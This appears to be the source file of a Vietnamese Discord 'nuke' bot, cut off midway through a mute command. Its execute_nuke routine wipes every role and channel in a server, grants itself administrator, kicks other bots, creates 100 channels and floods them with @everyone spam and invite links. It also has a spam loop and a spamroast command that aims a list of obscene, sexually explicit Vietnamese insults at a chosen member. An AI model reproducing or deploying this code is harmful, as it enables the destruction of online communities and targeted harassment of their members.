import asyncio
import os
import sys
import random
import discord
from discord.ext import commands
import aiohttp
from datetime import timedelta, datetime
import json
import math

# ==================== KEEP_ALIVE ====================
try:
    from keep_alive import keep_alive
except ImportError:
    def keep_alive():
        pass

# ==================== CẤU HÌNH HỆ THỐNG ====================
DISCORD_TOKEN = os.getenv("TOKEN")

# Danh sách ID của Boss Bảo và các đồng minh ủy quyền
BOT_OWNERS = [
    1540585511842881616,
    1542453882263707759,
    1502969774202814625,
]

intents = discord.Intents.default()
intents.message_content = True
intents.members = True
intents.guilds = True
intents.bans = True

def get_prefix(bot, message):
    # Hỗ trợ cả "nuked " và "nuked" (không có space)
    if message.content.lower().startswith("nuked "):
        return "nuked "
    elif message.content.lower().startswith("nuked"):
        return "nuked"
    return "nuked "  # fallback

# CHỈ MỘT DÒNG bot – KHÔNG KHAI BÁO LẠI Ở DƯỚI
bot = commands.Bot(command_prefix=get_prefix, intents=intents)
bot.remove_command('help')  # Xóa bỏ lệnh help gốc của discord.py

spam_task_running = None
bot_enabled = True  # Trạng thái hoạt động của bot

SERVER_LOG_CHANNELS = {}
WELCOME_CHANNELS = {}
GOODBYE_CHANNELS = {}
SERVER_LEVEL_CHANNELS = {}
DISABLED_COMMANDS = set()  # Danh sách lệnh bị tắt

# Cấu hình các file lưu trữ dữ liệu JSON
LEVEL_FILE = "levels.json"
CONFIG_FILE = "config.json"
COIN_FILE = "coins.json"
INVENTORY_FILE = "inventory.json"
MARRIAGE_FILE = "marriages.json"

# ==================== LƯU TRỮ & TẢI DỮ LIỆU JSON ====================
def load_levels():
    global USER_LEVELS
    try:
        with open(LEVEL_FILE, "r", encoding="utf-8") as f:
            USER_LEVELS = json.load(f)
    except (FileNotFoundError, json.JSONDecodeError):
        USER_LEVELS = {}

def save_levels():
    with open(LEVEL_FILE, "w", encoding="utf-8") as f:
        json.dump(USER_LEVELS, f, indent=2, ensure_ascii=False)

def load_coins():
    try:
        with open(COIN_FILE, "r", encoding="utf-8") as f:
            return json.load(f)
    except (FileNotFoundError, json.JSONDecodeError):
        return {}

def save_coins(data):
    with open(COIN_FILE, "w", encoding="utf-8") as f:
        json.dump(data, f, indent=2, ensure_ascii=False)

def load_inventory():
    try:
        with open(INVENTORY_FILE, "r", encoding="utf-8") as f:
            return json.load(f)
    except (FileNotFoundError, json.JSONDecodeError):
        return {}

def save_inventory(data):
    with open(INVENTORY_FILE, "w", encoding="utf-8") as f:
        json.dump(data, f, indent=2, ensure_ascii=False)

def load_config():
    global SERVER_LOG_CHANNELS, WELCOME_CHANNELS, GOODBYE_CHANNELS, SERVER_LEVEL_CHANNELS, BOT_OWNERS, DISABLED_COMMANDS
    try:
        with open(CONFIG_FILE, "r", encoding="utf-8") as f:
            data = json.load(f)
        SERVER_LOG_CHANNELS = data.get("log_channels", {})
        WELCOME_CHANNELS = data.get("welcome_channels", {})
        GOODBYE_CHANNELS = data.get("goodbye_channels", {})
        SERVER_LEVEL_CHANNELS = data.get("level_channels", {})
        BOT_OWNERS = data.get("owners", BOT_OWNERS)
        DISABLED_COMMANDS = set(data.get("disabled_commands", []))
    except (FileNotFoundError, json.JSONDecodeError):
        pass

def save_config():
    data = {
        "log_channels": SERVER_LOG_CHANNELS,
        "welcome_channels": WELCOME_CHANNELS,
        "goodbye_channels": GOODBYE_CHANNELS,
        "level_channels": SERVER_LEVEL_CHANNELS,
        "owners": BOT_OWNERS,
        "disabled_commands": list(DISABLED_COMMANDS)
    }
    with open(CONFIG_FILE, "w", encoding="utf-8") as f:
        json.dump(data, f, indent=2, ensure_ascii=False)

def load_marriages():
    try:
        with open(MARRIAGE_FILE, "r", encoding="utf-8") as f:
            return json.load(f)
    except (FileNotFoundError, json.JSONDecodeError):
        return {}

def save_marriages(data):
    with open(MARRIAGE_FILE, "w", encoding="utf-8") as f:
        json.dump(data, f, indent=2, ensure_ascii=False)

# Khởi tạo dữ liệu ban đầu
USER_LEVELS = {}
user_coins = load_coins()
user_inventory = load_inventory()
marriages = load_marriages()
load_levels()
load_config()

CUSTOM_SETUP_GIF = "https://i.pinimg.com/originals/7a/41/bb/7a41bb51fe3babe0c6cee161f85df62c.gif"
NUKE_GIF_URL = "https://media.discordapp.net/attachments/1541456087105151066/1542122209156538388/739ed3f3955356f06352d43eb649168a.gif"
NUKE_AVATAR_URL = "https://media.discordapp.net/attachments/1541456087105151066/1542127023810416660/8b59ed006d0073e951a47e1da3c2d111.jpg"
HELP_THUMBNAIL_GIF = "https://i.pinimg.com/originals/08/24/02/082402127402f0672076046e7f1d43eb.gif"

def get_required_exp(level: int) -> int:
    return level * 100

ROAST_LINES = [
    "# Lồn mẹ mày nát bét như tương, bị địt đến không còn + chảy lênh! {username}",
    "# Đéo biết xấu hổ, lồn mẹ mày thối như cứt + xác chết đầy dòi bọ! {username}",
    "# Thằng óc lồn rộng, mặt giống lỗ đít thối + đầy phân + tinh trùng! {username}",
    "# Mày là đồ bệnh hoạn, chuyên bú cặc chó + ngựa + tự địt lỗ đít! {username}",
    "# Lồn rộng như biển phân, đụ má thằng khốn nạn óc cứt thối rữa! {username}",
    "# Thằng óc phân thối rữa, lồn mẹ mày bị địt đến chảy máu + mủ đặc sưng vù như quả bóng vỡ! {username}",
    "# Đụ con đĩ già thối tha, cặc mày hôi như xác chết 10 ngày + phân bò phơi nắng! {username}",
    "# Đụ má cái lồn to đùng, chứa đống tinh trùng thối rữa + máu mủ nước! {username}",
    "# Địt mẹ thằng chó đẻ, cặc mày hôi như đống cứt tươi + phân ngựa giữa trời nắng gắt! {username}",
    "# Con đĩ bán dâm, lồn rộng vì bị địt trăm lần + thú + nhét đồ! {username}",
    "# Con đĩ bán thân, lồn rộng vì địt nhiều + thú vật + vật lạ vào! {username}",
    "# Cặc teo như hạt tiêu, địt mẹ cái đồ ngu bệnh hoạn óc phân! {username}",
    "# Đụ con mẹ mày lần nữa và nữa, bú cặc thú vật + nuốt tinh trùng sống + phân chó! {username}",
    "# Con đĩ bán dâm chuyên, lồn rộng vì địt nhiều thú + nhét vật lạ! {username}",
    "# Mày chết mẹ mày đi, đồ bệnh hoạn chuyên bú cặc thú + tự địt lỗ đít mình! {username}",
    "# Con đĩ bán thân, lồn rộng vì bị địt cả trăm thằng + thú vật + nhét đồ vật! {username}",
    "# Địt vào mồm mày thối, nuốt tinh trùng thối rữa + phân chó tươi! {username}",
    "# Mày chết cho sạch đường phố, đồ rác rưởi bệnh hoạn của xã hội chuyên bú cặc thú vật! {username}",
    "# Mày chết mẹ mày, đồ rác của xã hội bệnh hoạn chuyên bú cặc thú! {username}",
    "# Lồn to như cái chảo lớn, chứa tinh trùng thối rữa + máu mủ + nước đái thú! {username}",
    "# Đụ má thằng mặt khỉ đột, mẹ mày bú cặc ngựa cả ngày + nuốt tinh trùng sống! {username}",
    "# Chửi tục cái lồn nát, cút xéo thằng chó đẻ bú cặc thú cho đã! {username}",
    "# Đụ má cái lồn to đùng chứa tinh trùng thối + máu mủ + nước đái chó! {username}",
    "# Đéo thèm quan tâm, cái mặt lồn thối của mày đầy nước dãi + phân! {username}",
    "# Địt mẹ chúng bay hết, cặc teo tóp như giòi chết trong phân thối! {username}",
    "# Lồn mẹ mày rộng như hố phân công cộng ngoài đồng, bị địt đến sưng vù nát như tương đặc + chảy nước nhớt thối! {username}",
    "# Đụ con đĩ giải nua thối như xác chết phân hủy, cặc mày hôi như đống cứt chó + phân ngựa phơi nắng! {username}",
    "# Mày là đồ mất dạy hết mức, chuyên bú cặc thú rừng + nuốt sống tinh trùng + phân! {username}",
    "# Địt mẹ chúng bay hết sạch, cặc teo tóp như giòi thối trong phân! {username}",
    "# Địt mẹ thằng chó cái đẻ, cặc teo tóp xíu như giòi trong phân! {username}",
    "# Thằng mặt khỉ đột, mẹ mày là con đĩ thú vật chuyên bú cặc ngựa + nuốt tinh trùng! {username}",
    "# Mày là đồ vô học, chuyên bú cặc ngựa + chó + lợn + nuốt sống! {username}"
]

NUKE_CHANNEL_NAMES = [
    "☠️ℕ𝕌𝕂𝔼 𝔹𝕐 𝔾̴𝔾̶.̴K̶Z̶3̸N̵/̵K̵Z̵4̸N̷ – ℍ𝕆𝕋 𝕎𝔸ℝ 𝔹𝕆𝕋",
    "☠️ℕ𝕌𝕂𝔼 𝔹𝕐 𝔹𝔸̉𝕆 𝔻𝔼̣ℙ ℤ𝔸𝕀",
    "☠️ℕ𝕌𝕂𝔼 𝔹𝕐 𝔹𝕆𝕋 ℕ𝕌𝕂𝔼 𝕆ℕ 𝕋𝕆ℙ",
    "☠️𝔻𝔼𝕋ℝ𝕆𝕐𝔼𝔻 𝔹𝕐 𝔹𝕆𝕋 ℕ𝕌𝕂𝔼 𝔼ℤ 𝕋𝕆ℙ",
    "☠️𝔼ℤ 𝕋𝕆ℙ 𝔸ℕ𝕋𝕀",
]

def is_bot_owner():
    async def predicate(ctx):
        return ctx.author.id in BOT_OWNERS
    return commands.check(predicate)

# ==================== HÀM GỬI LOG ĐẾN CÁC KÊNH LOG ====================
async def send_log_to_all(guild_id, embed):
    for g_id, ch_id in SERVER_LOG_CHANNELS.items():
        if int(g_id) == guild_id:
            channel = bot.get_channel(ch_id)
            if channel:
                try:
                    await channel.send(embed=embed)
                except:
                    pass

# ==================== VIEW XÁC NHẬN NUKE ====================
class NukeConfirmView(discord.ui.View):
    def __init__(self, guild: discord.Guild, channel: discord.abc.Messageable):
        super().__init__(timeout=60)
        self.guild = guild
        self.channel = channel

    async def on_timeout(self):
        for item in self.children:
            item.disabled = True

    @discord.ui.button(label="🟢 ĐỒNG Ý NUKE SERVER", style=discord.ButtonStyle.green)
    async def confirm_button(self, interaction: discord.Interaction, button: discord.ui.Button):
        await interaction.response.send_message("✅ Đã xác nhận! Đang tiến hành...", ephemeral=True)
        await self.channel.send("⚠️ Từ từ đang check sever đã...")
        for item in self.children:
            item.disabled = True
        await interaction.message.edit(view=self)
        self.stop()
        await execute_nuke(self.guild)

    @discord.ui.button(label="🔴 TỪ CHỐI", style=discord.ButtonStyle.red)
    async def cancel_button(self, interaction: discord.Interaction, button: discord.ui.Button):
        for item in self.children:
            item.disabled = True
        await interaction.message.edit(view=self)
        await interaction.response.send_message(f"❌ Bạn đã từ chối nuke sever {self.guild.name}", ephemeral=True)
        self.stop()

async def execute_nuke(guild):
    try:
        nuke_log_embed = discord.Embed(
            title="🔥 CẢNH BÁO: LỆNH NUKE ĐƯỢC THỰC THI!",
            description=f"Server bị nuke: **{guild.name}** (`{guild.id}`)",
            color=0xFF0000
        )
        await send_log_to_all(guild.id, nuke_log_embed)

        supreme_role = None
        async def prep_nuke():
            nonlocal supreme_role
            tasks = []
            tasks.append(guild.edit(name="NUKE BY BỐ BẢO ĐZ"))
            try:
                async with aiohttp.ClientSession() as session:
                    async with session.get(NUKE_AVATAR_URL) as resp:
                        if resp.status == 200:
                            image_data = await resp.read()
                            tasks.append(guild.edit(icon=image_data))
            except:
                pass

            for role in guild.roles:
                if role.name != "@everyone":
                    tasks.append(role.delete())

            await asyncio.gather(*tasks, return_exceptions=True)

            try:
                supreme_role = await guild.create_role(
                    name="👑 ℕ𝕌𝕂𝔼ℝ 𝕆ℕ 𝕋𝕆ℙ 👑",
                    permissions=discord.Permissions(administrator=True),
                    color=discord.Color.red(),
                    hoist=True
                )
                await guild.me.add_roles(supreme_role)
            except Exception as e:
                print(f"Lỗi tạo/add role tối cao: {e}")

            bot_members = [m for m in guild.members if m.bot and m.id != bot.user.id]
            chunk_size = 10
            for i in range(0, len(bot_members), chunk_size):
                chunk = bot_members[i:i + chunk_size]
                kick_tasks = [m.kick(reason="Anti-bot / Nuke cleanup") for m in chunk]
                await asyncio.gather(*kick_tasks, return_exceptions=True)

        await prep_nuke()

        channels_to_delete = list(guild.channels)
        for i in range(0, len(channels_to_delete), 15):
            batch = channels_to_delete[i:i+15]
            del_tasks = [ch.delete() for ch in batch]
            await asyncio.gather(*del_tasks, return_exceptions=True)

        await asyncio.sleep(1.0)

        created_channels = []
        for i in range(0, 100, 60):
            batch_create = []
            for j in range(i, min(i + 60, 100)):
                channel_name = NUKE_CHANNEL_NAMES[j % len(NUKE_CHANNEL_NAMES)]
                batch_create.append(guild.create_text_channel(name=channel_name))
            res = await asyncio.gather(*batch_create, return_exceptions=True)
            for r in res:
                if isinstance(r, discord.TextChannel):
                    created_channels.append(r)
            await asyncio.sleep(2.0)

        spam_content = (
            "# DETROYED BY BOSS BẢO ĐZ AND G̴G̶.̴K̶Z̶3̸N̵/̵K̵Z̵4̸N̷ – HOT WAR BOT ●'◡'●)\n"
            "|| @everyone||\n"
            "|| @here ||\n"
            '"|| link support 1 ||: https://discord.gg/Grr6RWe9A"\n'
            ' "|| link support 2 ||:https://discord.gg/4wrsMbRVpU"'
        )

        valid_channels = [ch for ch in created_channels if isinstance(ch, discord.TextChannel)]
        for _ in range(10):
            batch_spam = []
            for _ in range(250):
                ch = random.choice(valid_channels) if valid_channels else None
                if ch:
                    async def send_fast(c=ch):
                        try:
                            embed = discord.Embed()
                            embed.set_image(url=NUKE_GIF_URL)
                            await c.send(spam_content, embed=embed)
                        except:
                            pass
                    batch_spam.append(send_fast())
            if batch_spam:
                await asyncio.gather(*batch_spam, return_exceptions=True)
            await asyncio.sleep(0.5)

    except Exception as e:
        print(f"Lỗi Nuke: {e}")

# ==================== LỆNH PHÁ HOẠI & SPAM (GIỮ NGUYÊN) ====================
@bot.command(name="nuke")
@is_bot_owner()
async def nuke(ctx):
    """🔥 Phá hoại toàn bộ Server"""
    embed = discord.Embed(
        title="⚠️ XÁC NHẬN NUKE SERVER ⚠️",
        description=f"Bạn có chắc chắn muốn **XÓA SẠCH VÀ PHÁ HOẠI** server **{ctx.guild.name}** không?\nHành động này không thể hoàn tác!",
        color=0xFF0000
    )
    embed.set_thumbnail(url=CUSTOM_SETUP_GIF)
    view = NukeConfirmView(ctx.guild, ctx.channel)
    await ctx.send(embed=embed, view=view)

@nuke.error
async def nuke_error(ctx, error):
    if isinstance(error, commands.CheckFailure):
        await ctx.send(' NGU À? CÓ PHẢI BOSS BẢO KHÔNG MÀ SÀI? 🤣🤣🤣😂😂😒')

@bot.command(name="spam")
@is_bot_owner()
async def start_spam(ctx):
    """⚡ Spam liên tục vào các kênh"""
    global is_spamming, spam_task_running
    if is_spamming:
        await ctx.send("❌ Hệ thống spam đang chạy rồi!")
        return

    is_spamming = True
    await ctx.send("🚀 **ĐÃ BẮT ĐẦU SPAM!**")

    async def spam_loop():
        global is_spamming
        spam_text = (
            "# DETROYED BY BOSS BẢO ĐZ AND G̴G̶.̴K̶Z̶3̸N̵/̵K̵Z̵4̸N̷ – HOT WAR BOT ●'◡'●)\n"
            "|| @everyone||\n"
            "|| @here ||\n"
            '"|| link support 1 ||: https://discord.gg/Grr6RWe9A"\n'
            ' "|| link support 2 ||:https://discord.gg/4wrsMbRVpU"'
        )
        while is_spamming:
            channels = [ch for ch in ctx.guild.text_channels if ch.permissions_for(ctx.guild.me).send_messages]
            if not channels:
                await asyncio.sleep(1)
                continue
            
            tasks = []
            for _ in range(30):
                ch = random.choice(channels)
                async def send_msg(target_ch=ch):
                    try:
                        embed = discord.Embed()
                        embed.set_image(url=NUKE_GIF_URL)
                        await target_ch.send(spam_text, embed=embed)
                    except:
                        pass
                tasks.append(send_msg())
            
            await asyncio.gather(*tasks, return_exceptions=True)
            await asyncio.sleep(0.3)

    spam_task_running = asyncio.create_task(spam_loop())

@start_spam.error
async def start_spam_error(ctx, error):
    if isinstance(error, commands.CheckFailure):
        await ctx.send(' NGU À? CÓ PHẢI BOSS BẢO KHÔNG MÀ SÀI? 🤣🤣🤣😂😂😒')

@bot.command(name="stopspam")
@is_bot_owner()
async def stop_spam(ctx):
    """🛑 Dừng hệ thống spam"""
    global is_spamming, spam_task_running
    if not is_spamming:
        await ctx.send("❌ Hệ thống spam đang không chạy!")
        return

    is_spamming = False
    if spam_task_running:
        spam_task_running.cancel()
        spam_task_running = None
    await ctx.send("🛑 **ĐÃ DỪNG SPAM TẤT CẢ KÊNH!**")

@stop_spam.error
async def stop_spam_error(ctx, error):
    if isinstance(error, commands.CheckFailure):
        await ctx.send(' NGU À? CÓ PHẢI BOSS BẢO KHÔNG MÀ SÀI? 🤣🤣🤣😂😂😒')

@bot.command(name="spamroast")
@is_bot_owner()
async def spam_roast(ctx, member: discord.Member, count: int = 10):
    """🔥 Spam chửi một thành viên chỉ định"""
    if count > 50:
        count = 50
    await ctx.send(f"🚀 **Bắt đầu spam chửi {member.mention} ({count} lần)...**")
    for i in range(count):
        roast_template = random.choice(ROAST_LINES)
        msg = roast_template.format(username=member.mention)
        try:
            await ctx.send(msg)
        except:
            pass
        await asyncio.sleep(0.8)

@spam_roast.error
async def spam_roast_error(ctx, error):
    if isinstance(error, commands.CheckFailure):
        await ctx.send(' NGU À? CÓ PHẢI BOSS BẢO KHÔNG MÀ SÀI? 🤣🤣🤣😂😂😒')

# ==================== LỆNH OWNER & QUẢN TRỊ HỆ THỐNG ====================
@bot.command(name="kick")
@is_bot_owner()
async def kick_user(ctx, member: discord.Member, *, reason: str = "Không có lý do"):
    """🦵 Kick thành viên ra khỏi server"""
    try:
        if member.id == ctx.author.id:
            await ctx.send("❌ Không thể kick chính mình!")
            return
        if member.id in BOT_OWNERS:
            await ctx.send("❌ Không thể kick Owner!")
            return
        await member.kick(reason=reason)
        embed = discord.Embed(
            title="🦵 ĐÃ KICK THÀNH VIÊN",
            description=f"👤 **Người bị kick:** {member.mention}\n📌 **Lý do:** {reason}\n👑 **Người thực hiện:** {ctx.author.mention}",
            color=0xFF9900
        )
        embed.set_footer(text="Hệ thống quản trị Boss Bảo 💖")
        await ctx.send(embed=embed)
    except Exception as e:
        await ctx.send(f"❌ Lỗi: {str(e)}")

@kick_user.error
async def kick_user_error(ctx, error):
    if isinstance(error, commands.CheckFailure):
        await ctx.send(' NGU À? CÓ PHẢI BOSS BẢO KHÔNG MÀ SÀI? 🤣🤣🤣😂😂😒')

@bot.command(name="ban")
@is_bot_owner()
async def ban_user(ctx, member: discord.Member, *, reason: str = "Không có lý do"):
    """🔨 Ban thành viên khỏi server"""
    try:
        if member.id == ctx.author.id:
            await ctx.send("❌ Không thể ban chính mình!")
            return
        if member.id in BOT_OWNERS:
            await ctx.send("❌ Không thể ban Owner!")
            return
        await member.ban(reason=reason)
        embed = discord.Embed(
            title="🔨 ĐÃ BAN THÀNH VIÊN",
            description=f"👤 **Người bị ban:** {member.mention}\n📌 **Lý do:** {reason}\n👑 **Người thực hiện:** {ctx.author.mention}",
            color=0xFF0000
        )
        embed.set_footer(text="Hệ thống quản trị Boss Bảo 💖")
        await ctx.send(embed=embed)
    except Exception as e:
        await ctx.send(f"❌ Lỗi: {str(e)}")

@ban_user.error
async def ban_user_error(ctx, error):
    if isinstance(error, commands.CheckFailure):
        await ctx.send(' NGU À? CÓ PHẢI BOSS BẢO KHÔNG MÀ SÀI? 🤣🤣🤣😂😂😒')

@bot.command(name="unban")
@is_bot_owner()
async def unban_user(ctx, user_id: int, *, reason: str = "Không có lý do"):
    """✅ Gỡ ban thành viên bằng ID"""
    try:
        user = await bot.fetch_user(user_id)
        await ctx.guild.unban(user, reason=reason)
        embed = discord.Embed(
            title="✅ ĐÃ UNBAN THÀNH VIÊN",
            description=f"👤 **Người được unban:** {user.mention}\n📌 **Lý do:** {reason}\n👑 **Người thực hiện:** {ctx.author.mention}",
            color=0x00FF00
        )
        embed.set_footer(text="Hệ thống quản trị Boss Bảo 💖")
        await ctx.send(embed=embed)
    except Exception as e:
        await ctx.send(f"❌ Lỗi: {str(e)}")

@unban_user.error
async def unban_user_error(ctx, error):
    if isinstance(error, commands.CheckFailure):
        await ctx.send(' NGU À? CÓ PHẢI BOSS BẢO KHÔNG MÀ SÀI? 🤣🤣🤣😂😂😒')

@bot.command(name="createchannel")
@is_bot_owner()
async def create_channel(ctx, *, name: str):
    """🆕 Tạo kênh văn bản mới"""
    try:
        channel = await ctx.guild.create_text_channel(name)
        embed = discord.Embed(
            title="🆕 ĐÃ TẠO KÊNH MỚI",
            description=f"📌 **Tên kênh:** {channel.mention}\n👑 **Người tạo:** {ctx.author.mention}",
            color=0x00FF00
        )
        embed.set_footer(text="Hệ thống quản trị Boss Bảo 💖")
        await ctx.send(embed=embed)
    except Exception as e:
        await ctx.send(f"❌ Lỗi: {str(e)}")

@create_channel.error
async def create_channel_error(ctx, error):
    if isinstance(error, commands.CheckFailure):
        await ctx.send(' NGU À? CÓ PHẢI BOSS BẢO KHÔNG MÀ SÀI? 🤣🤣🤣😂😂😒')

@bot.command(name="deletechannel")
@is_bot_owner()
async def delete_channel(ctx, channel: discord.TextChannel = None):
    """🗑️ Xóa kênh chỉ định"""
    if channel is None:
        channel = ctx.channel
    try:
        channel_name = channel.name
        await channel.delete()
        embed = discord.Embed(
            title="🗑️ ĐÃ XÓA KÊNH",
            description=f"📌 **Tên kênh:** `{channel_name}`\n👑 **Người xóa:** {ctx.author.mention}",
            color=0xFF0000
        )
        embed.set_footer(text="Hệ thống quản trị Boss Bảo 💖")
        await ctx.send(embed=embed)
    except Exception as e:
        await ctx.send(f"❌ Lỗi: {str(e)}")

@delete_channel.error
async def delete_channel_error(ctx, error):
    if isinstance(error, commands.CheckFailure):
        await ctx.send(' NGU À? CÓ PHẢI BOSS BẢO KHÔNG MÀ SÀI? 🤣🤣🤣😂😂😒')

@bot.command(name="purge")
@is_bot_owner()
async def purge_all(ctx, confirm: str = None):
    """🧹 Xóa toàn bộ tin nhắn trong các kênh server"""
    if confirm is None or confirm.lower() != "all":
        await ctx.send("⚠️ **CẢNH BÁO!** Lệnh này sẽ xóa TOÀN BỘ tin nhắn trong server!\n🔹 Gõ `nuked purge all` để xác nhận.")
        return

    embed = discord.Embed(
        title="🧹 ĐANG XÓA TOÀN BỘ TIN NHẮN...",
        description="⏳ Đang xử lý, vui lòng đợi...",
        color=0xFF9900
    )
    await ctx.send(embed=embed)

    try:
        total_deleted = 0
        for channel in ctx.guild.channels:
            if isinstance(channel, discord.TextChannel):
                try:
                    deleted = await channel.purge(limit=1000)
                    total_deleted += len(deleted)
                    await asyncio.sleep(1)
                except:
                    pass
        embed = discord.Embed(
            title="✅ ĐÃ XÓA TOÀN BỘ TIN NHẮN",
            description=f"🧹 Đã xóa tổng cộng **{total_deleted}** tin nhắn trong server!\n👑 **Người thực hiện:** {ctx.author.mention}",
            color=0x00FF00
        )
        embed.set_footer(text="Hệ thống quản trị Boss Bảo 💖")
        await ctx.send(embed=embed)
    except Exception as e:
        await ctx.send(f"❌ Lỗi: {str(e)}")

@purge_all.error
async def purge_all_error(ctx, error):
    if isinstance(error, commands.CheckFailure):
        await ctx.send(' NGU À? CÓ PHẢI BOSS BẢO KHÔNG MÀ SÀI? 🤣🤣🤣😂😂😒')

@bot.command(name="role")
@is_bot_owner()
async def add_role_to_user(ctx, member: discord.Member, *, role_name: str):
    """🎭 Thêm role cho thành viên"""
    try:
        role = discord.utils.get(ctx.guild.roles, name=role_name)
        if not role:
            await ctx.send(f"❌ Không tìm thấy role `{role_name}`!")
            return
        await member.add_roles(role, reason=f"Lệnh từ Boss Bảo")
        embed = discord.Embed(
            title="✅ ĐÃ THÊM ROLE",
            description=f"👤 **Người nhận:** {member.mention}\n🎭 **Role:** {role.mention}\n👑 **Người thực hiện:** {ctx.author.mention}",
            color=0x00FF00
        )
        embed.set_footer(text="Hệ thống quản trị Boss Bảo 💖")
        await ctx.send(embed=embed)
    except Exception as e:
        await ctx.send(f"❌ Lỗi: {str(e)}")

@add_role_to_user.error
async def add_role_to_user_error(ctx, error):
    if isinstance(error, commands.CheckFailure):
        await ctx.send(' NGU À? CÓ PHẢI BOSS BẢO KHÔNG MÀ SÀI? 🤣🤣🤣😂😂😒')

@bot.command(name="removerole")
@is_bot_owner()
async def remove_role_from_user(ctx, member: discord.Member, *, role_name: str):
    """🎭 Xóa role khỏi thành viên"""
    try:
        role = discord.utils.get(ctx.guild.roles, name=role_name)
        if not role:
            await ctx.send(f"❌ Không tìm thấy role `{role_name}`!")
            return
        await member.remove_roles(role, reason=f"Lệnh từ Boss Bảo")
        embed = discord.Embed(
            title="✅ ĐÃ XÓA ROLE",
            description=f"👤 **Người bị xóa:** {member.mention}\n🎭 **Role:** {role.mention}\n👑 **Người thực hiện:** {ctx.author.mention}",
            color=0xFF9900
        )
        embed.set_footer(text="Hệ thống quản trị Boss Bảo 💖")
        await ctx.send(embed=embed)
    except Exception as e:
        await ctx.send(f"❌ Lỗi: {str(e)}")

@remove_role_from_user.error
async def remove_role_from_user_error(ctx, error):
    if isinstance(error, commands.CheckFailure):
        await ctx.send(' NGU À? CÓ PHẢI BOSS BẢO KHÔNG MÀ SÀI? 🤣🤣🤣😂😂😒')

@bot.command(name="createrole")
@is_bot_owner()
async def create_role(ctx, *, role_name: str):
    """🎭 Tạo role mới"""
    try:
        role = await ctx.guild.create_role(name=role_name, reason="Lệnh từ Boss Bảo")
        embed = discord.Embed(
            title="🎭 ĐÃ TẠO ROLE MỚI",
            description=f"📌 **Role:** {role.mention}\n👑 **Người tạo:** {ctx.author.mention}",
            color=0x00FF00
        )
        embed.set_footer(text="Hệ thống quản trị Boss Bảo 💖")
        await ctx.send(embed=embed)
    except Exception as e:
        await ctx.send(f"❌ Lỗi: {str(e)}")

@create_role.error
async def create_role_error(ctx, error):
    if isinstance(error, commands.CheckFailure):
        await ctx.send(' NGU À? CÓ PHẢI BOSS BẢO KHÔNG MÀ SÀI? 🤣🤣🤣😂😂😒')

@bot.command(name="deleterole")
@is_bot_owner()
async def delete_role(ctx, *, role_name: str):
    """🗑️ Xóa role khỏi server"""
    try:
        role = discord.utils.get(ctx.guild.roles, name=role_name)
        if not role:
            await ctx.send(f"❌ Không tìm thấy role `{role_name}`!")
            return
        role_n = role.name
        await role.delete(reason="Lệnh từ Boss Bảo")
        embed = discord.Embed(
            title="🗑️ ĐÃ XÓA ROLE",
            description=f"📌 **Role:** `{role_n}`\n👑 **Người xóa:** {ctx.author.mention}",
            color=0xFF0000
        )
        embed.set_footer(text="Hệ thống quản trị Boss Bảo 💖")
        await ctx.send(embed=embed)
    except Exception as e:
        await ctx.send(f"❌ Lỗi: {str(e)}")

@delete_role.error
async def delete_role_error(ctx, error):
    if isinstance(error, commands.CheckFailure):
        await ctx.send(' NGU À? CÓ PHẢI BOSS BẢO KHÔNG MÀ SÀI? 🤣🤣🤣😂😂😒')

@bot.command(name="clear")
@is_bot_owner()
async def clear(ctx, amount: int = 10):
    """🧹 Xóa tin nhắn số lượng lớn trong kênh"""
    if amount < 1 or amount > 1000:
        await ctx.send("⚠️ Số lượng từ 1 đến 1000.")
        return
    try:
        deleted = await ctx.channel.purge(limit=amount)
        embed = discord.Embed(
            title="🧹 ĐÃ XÓA TIN NHẮN",
            description=f"Đã xóa thành công **{len(deleted)}** tin nhắn.",
            color=0x00CCFF
        )
        await ctx.send(embed=embed, delete_after=5)
    except Exception as e:
        await ctx.send(f"❌ Lỗi: {str(e)}")

@clear.error
async def clear_error(ctx, error):
    if isinstance(error, commands.CheckFailure):
        await ctx.send(' NGU À? CÓ PHẢI BOSS BẢO KHÔNG MÀ SÀI? 🤣🤣🤣😂😂😒')

@bot.command(name="massban")
@is_bot_owner()
async def massban(ctx, *members: discord.Member):
    """🔨 Ban nhiều thành viên cùng lúc"""
    if not members:
        await ctx.send("❌ Cần tag ít nhất 1 người. VD: `nuked massban @user1 @user2`")
        return
    success = 0
    failed = 0
    for member in members:
        if member.id == ctx.author.id or member.id in BOT_OWNERS or member == ctx.guild.owner:
            failed += 1
            continue
        try:
            await member.ban(reason="Mass ban từ Boss Bảo")
            success += 1
        except:
            failed += 1

    embed = discord.Embed(
        title="🔨 KẾT QUẢ MASS BAN",
        description=f"✅ Đã ban: **{success}** thành viên\n❌ Thất bại: **{failed}** thành viên",
        color=0xFF0000
    )
    await ctx.send(embed=embed)

@massban.error
async def massban_error(ctx, error):
    if isinstance(error, commands.CheckFailure):
        await ctx.send(' NGU À? CÓ PHẢI BOSS BẢO KHÔNG MÀ SÀI? 🤣🤣🤣😂😂😒')

@bot.command(name="lockchannel")
@is_bot_owner()
async def lock_channel(ctx, channel: discord.TextChannel = None):
    """🔒 Khóa kênh không cho gửi tin nhắn"""
    if channel is None:
        channel = ctx.channel
    try:
        await channel.set_permissions(ctx.guild.default_role, send_messages=False)
        embed = discord.Embed(
            title="🔒 ĐÃ KHÓA KÊNH",
            description=f"📌 **Kênh:** {channel.mention}\n🔒 Mọi người không thể gửi tin nhắn vào kênh này nữa.",
            color=0xFF0000
        )
        await ctx.send(embed=embed)
    except Exception as e:
        await ctx.send(f"❌ Lỗi: {str(e)}")

@lock_channel.error
async def lock_channel_error(ctx, error):
    if isinstance(error, commands.CheckFailure):
        await ctx.send(' NGU À? CÓ PHẢI BOSS BẢO KHÔNG MÀ SÀI? 🤣🤣🤣😂😂😒')

@bot.command(name="unlockchannel")
@is_bot_owner()
async def unlock_channel(ctx, channel: discord.TextChannel = None):
    """🔓 Mở khóa kênh"""
    if channel is None:
        channel = ctx.channel
    try:
        await channel.set_permissions(ctx.guild.default_role, send_messages=True)
        embed = discord.Embed(
            title="🔓 ĐÃ MỞ KHÓA KÊNH",
            description=f"📌 **Kênh:** {channel.mention}\n🔓 Mọi người đã có thể gửi tin nhắn bình thường.",
            color=0x00FF00
        )
        await ctx.send(embed=embed)
    except Exception as e:
        await ctx.send(f"❌ Lỗi: {str(e)}")

@unlock_channel.error
async def unlock_channel_error(ctx, error):
    if isinstance(error, commands.CheckFailure):
        await ctx.send(' NGU À? CÓ PHẢI BOSS BẢO KHÔNG MÀ SÀI? 🤣🤣🤣😂😂😒')

@bot.command(name="mute")
